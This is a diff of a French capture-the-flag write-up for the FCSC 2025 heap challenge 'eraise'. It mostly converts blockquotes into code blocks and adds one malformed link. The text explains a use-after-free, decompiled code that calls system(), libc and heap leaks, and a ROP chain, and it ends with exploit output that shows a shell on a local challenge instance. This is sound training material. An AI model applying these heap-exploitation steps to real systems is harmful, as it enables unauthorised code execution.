@@ -6,7 +6,7 @@ categories: CTF
 ---
 
 # Challenge: eraise
-https://hackropole.fr/fr/challenges/pwn/fcsc2025-pwn-eraise/
+[https://hackropole.fr/fr/challenges/pwn/fcsc2025-pwn-eraise/)](https://hackropole.fr/fr/challenges/pwn/fcsc2025-pwn-eraise/
 
 Il s'agit d'une application pour allouer et libérer de la mémoire, on part donc sur une vulnérabilité de heap.  
 Effectivement en tatonnant on s'apercoit rapidement qu'on peut éditer un slot libéré.
@@ -20,13 +20,14 @@ Le pointeur vers ce tableau est stocké dans la section .bss, à l'adresse &team
 Il est aussi stocké dans la variable var\_c8 dans main().
 
 On peut voir qu'il y a une autre variable sur la pile (renommée isboss) qui conditionne l'accès à un shell:
-
-> +0x22fd case 5  
-> +0x22fd   if (isboss != 0)  
-> +0x2322   char line\[0x88\]  
-> +0x2322   read\_string(&line, 0x80)  
-> +0x2331   system(&line)  
-> +0x2336   continue
+```
++0x22fd case 5  
++0x22fd   if (isboss != 0)  
++0x2322   char line\[0x88\]  
++0x2322   read\_string(&line, 0x80)  
++0x2331   system(&line)  
++0x2336   continue
+```
 
 Je n'ai jamais réussi à l'écraser, ni à sauter à cette adresse..  
 Soit c'est une fausse piste ou plus probablement ma solution n'est pas celle attendue..
@@ -37,12 +38,14 @@ En affichant le login "welcome back" il affiche ce qu'il y a derrière jusqu'au 
 Retour à l'UAF.  
 Il y a 10 slots dans la table pour les employés, ils ne sont pas remis à zéro quand on en libère un.
 
-> +0x1dd7 int64\_t rax\_3 = \*(tableemployes + (arg1 \<\< 3))  
-> +0x1dd7  
-> +0x1de3 if (rax\_3 != 0)  
-> +0x1e04   free(mem: rax\_3)  
-> +0x1e09   return 1  
-> +0x1e09
+```c
++0x1dd7 int64\_t rax\_3 = \*(tableemployes + (arg1 \<\< 3))  
++0x1dd7  
++0x1de3 if (rax\_3 != 0)  
++0x1e04   free(mem: rax\_3)  
++0x1e09   return 1  
++0x1e09
+```
 
 On libère bien le bloc mémoire, mais pas le pointeur vers l'employé dans la table. D'où le use after free.  
 On peut s'en rendre compte en "employant" 10 personnes, puis en les libérant toutes, on ne peut plus en rembaucher.
@@ -73,19 +76,21 @@ On fait le deuxième UAF pour y écrire.
 J'ai essayé les one gadget disponibles (adresses dans libc qui donne un shell), mais les contraintes n'étaient pas remplies.  
 J'ai donc fait du [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming) avec les gadgets disponibles.
 
->➜  eraise ./exploit.py REMOTE
->[+] Opening connection to 127.0.0.1 on port 4000: Done
->[+] libc.address  0x70c68e573000
->[+] heap base     0x5717977e9000
->[*] Will attempt to write 0x70c68e78bd78 at 0x5717977e92a0
->[*] get *environ
->[+] stack.environ offset 0x7ffcef84d948
->[*] Will attempt to write a ROP chain at 0x7ffcef84d700
->[*] Loaded 116 cached gadgets for './libc-2.40.so'
->[*] Switching to interactive mode
->Linux 4747472fd454 6.8.0-90-generic #91-Ubuntu SMP PREEMPT_DYNAMIC Tue Nov 18 14:14:30 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
->$ id
->uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
+```bash
+➜  eraise ./exploit.py REMOTE
+[+] Opening connection to 127.0.0.1 on port 4000: Done
+[+] libc.address  0x70c68e573000
+[+] heap base     0x5717977e9000
+[*] Will attempt to write 0x70c68e78bd78 at 0x5717977e92a0
+[*] get *environ
+[+] stack.environ offset 0x7ffcef84d948
+[*] Will attempt to write a ROP chain at 0x7ffcef84d700
+[*] Loaded 116 cached gadgets for './libc-2.40.so'
+[*] Switching to interactive mode
+Linux 4747472fd454 6.8.0-90-generic #91-Ubuntu SMP PREEMPT_DYNAMIC Tue Nov 18 14:14:30 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+$ id
+uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
+```
 
  - mandragore / 20260211
 
